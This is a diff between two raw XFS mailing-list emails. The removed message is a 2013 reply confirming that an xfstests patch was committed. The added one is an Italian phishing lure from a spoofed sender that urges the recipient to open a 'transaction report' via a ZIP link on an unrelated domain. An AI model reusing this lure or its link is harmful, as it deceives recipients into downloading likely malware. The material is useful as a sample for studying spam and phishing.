@@ -1,14 +1,21 @@
 Return-Path: <xfs-bounces@oss.sgi.com>
-Received: from relay.sgi.com (relay2.corp.sgi.com [137.38.102.29])
-	by oss.sgi.com (Postfix) with ESMTP id EAF677F88
-	for <xfs@oss.sgi.com>; Tue, 12 Nov 2013 21:41:20 -0600 (CST)
-Message-ID: <5282F4DE.70005@sgi.com>
-Date: Tue, 12 Nov 2013 21:41:18 -0600
-From: Rich Johnston <rjohnston@sgi.com>
+Received: from relay.sgi.com (relay3.corp.sgi.com [198.149.34.15])
+	by oss.sgi.com (Postfix) with ESMTP id A60DA7F88
+	for <linux-xfs@oss.sgi.com>; Tue, 12 Nov 2013 23:07:17 -0600 (CST)
+Received: from cuda.sgi.com (cuda1.sgi.com [192.48.157.11])
+	by relay3.corp.sgi.com (Postfix) with ESMTP id 45E5EAC003
+	for <linux-xfs@oss.sgi.com>; Tue, 12 Nov 2013 21:07:14 -0800 (PST)
+Received: from falcon450 ([199.217.115.133]) by cuda.sgi.com with ESMTP id
+	pvvHD3FDdny1ASmB for <linux-xfs@oss.sgi.com>;
+	Tue, 12 Nov 2013 21:07:09 -0800 (PST)
+Received: from falcon450 (IOM-89-33 [{#CLIENT_IP}]) by falcon450 (mailer) with
+	SMTP id wwdVB7ysn1eI for <linux-xfs@oss.sgi.com>;
+	Wed, 13 Nov 2013 03:07:09 -0200
+Date: Wed, 13 Nov 2013 03:07:09 -0200
+From: <gianni@istitutotumori.mi.it>
+Subject: Fwd: Affrontare 309946
+Message-Id: <iAiX9jtW.pSBKeJJW6KBOc6@falcon450>
 MIME-Version: 1.0
-Subject: Re: [PATCH v3] xfstests generic/320: heavy rm workload test
-References: <1384243184-19406-1-git-send-email-eguan@redhat.com>
-In-Reply-To: <1384243184-19406-1-git-send-email-eguan@redhat.com>
 List-Id: XFS Filesystem from SGI <xfs.oss.sgi.com>
 List-Unsubscribe: <http://oss.sgi.com/mailman/options/xfs>,
 	<mailto:xfs-request@oss.sgi.com?subject=unsubscribe>
@@ -17,22 +24,20 @@ List-Post: <mailto:xfs@oss.sgi.com>
 List-Help: <mailto:xfs-request@oss.sgi.com?subject=help>
 List-Subscribe: <http://oss.sgi.com/mailman/listinfo/xfs>,
 	<mailto:xfs-request@oss.sgi.com?subject=subscribe>
+Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
-Content-Type: text/plain; charset="us-ascii"; Format="flowed"
 Errors-To: xfs-bounces@oss.sgi.com
 Sender: xfs-bounces@oss.sgi.com
-To: Eryu Guan <eguan@redhat.com>, xfs@oss.sgi.com
+To: linux-xfs@oss.sgi.com
 
-This has been committed.
 
-Thanks
---Rich
 
-commit 10298d30e55cf2f1853cbc6b15437e78e47140c6
-Author: Eryu Guan <eguan@redhat.com>
-Date:   Tue Nov 12 07:59:44 2013 +0000
 
-     xfstests generic/320: heavy rm workload test
+Buongiorno, linux-xfs@oss.sgi.com.       
+   
+In conformita con la vostra applicazione vi inviera una relazione sulla transazione da 1.11.12.
+http://e-natura.gr/documentation/Documentazione.zip?avfJ5OrF7kl=linux-xfs@oss.sgi.com
+
 
 _______________________________________________
 xfs mailing list
